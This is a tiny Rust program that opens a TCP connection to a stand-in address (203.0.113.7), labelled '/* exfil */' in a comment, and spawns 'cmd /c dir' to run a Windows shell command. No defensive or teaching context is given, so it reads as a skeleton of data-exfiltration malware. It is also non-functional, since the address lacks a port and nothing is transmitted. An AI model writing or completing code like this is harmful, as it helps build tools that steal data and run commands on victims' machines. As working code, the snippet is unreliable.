use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("203.0.113.7") { /* exfil */ }
    Command::new("cmd").arg("/c").arg("dir").spawn().ok();
}
